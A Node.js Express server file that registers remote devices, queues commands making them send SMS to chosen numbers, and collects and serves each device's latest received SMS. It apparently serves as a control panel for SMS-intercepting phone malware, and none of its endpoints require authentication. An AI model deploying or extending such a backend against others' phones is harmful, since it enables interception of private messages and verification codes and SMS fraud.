const express = require("express");
const cors = require("cors");
const { v4: uuidv4 } = require("uuid");

const app = express();
app.use(cors());
app.use(express.json());

/**
 * In-memory store
 */
const devices = {};   // deviceId -> { deviceId, model, registeredAt }
const commands = {};  // deviceId -> [ { id, number, message } ]
const smsData = {};   // deviceId -> latest 10 SMS

// ------------------ Device Registration ------------------
app.post("/register", (req, res) => {
    const { deviceId, model } = req.body;
    if (!deviceId) return res.status(400).json({ success: false, error: "deviceId required" });

    devices[deviceId] = { deviceId, model: model || "unknown", registeredAt: new Date() };
    if (!commands[deviceId]) commands[deviceId] = [];
    if (!smsData[deviceId]) smsData[deviceId] = [];

    res.json({ success: true });
});

// ------------------ Fetch all devices ------------------
app.get("/fetch", (req, res) => {
    res.json(Object.values(devices));
});

// ------------------ Send SMS command to device ------------------
app.post("/sendsms", (req, res) => {
    const { deviceId, number, message } = req.body;

    if (!devices[deviceId]) return res.status(404).json({ success: false, error: "Device not found" });

    const cmd = { id: uuidv4(), number, message };
    commands[deviceId].push(cmd);

    res.json({ success: true, command: cmd });
});

// ------------------ Device polls for commands ------------------
app.get("/commands", (req, res) => {
    const { deviceId } = req.query;
    if (!commands[deviceId]) return res.json([]);

    const pending = commands[deviceId];
    commands[deviceId] = []; // clear after sending
    res.json(pending);
});

// ------------------ Device sends latest SMS ------------------
app.post("/smsread", (req, res) => {
    const { deviceId, sms } = req.body;
    if (!deviceId || !sms) return res.status(400).json({ success: false, error: "deviceId or sms missing" });

    smsData[deviceId] = sms; // store latest 10 SMS
    res.json({ success: true });
});

// ------------------ Fetch latest SMS of a device ------------------
app.post("/get-sms", (req, res) => {
    const { deviceId } = req.body;
    if (!deviceId) return res.status(400).json({ success: false, error: "deviceId required" });

    res.json(smsData[deviceId] || []);
});

// ------------------ Start server ------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
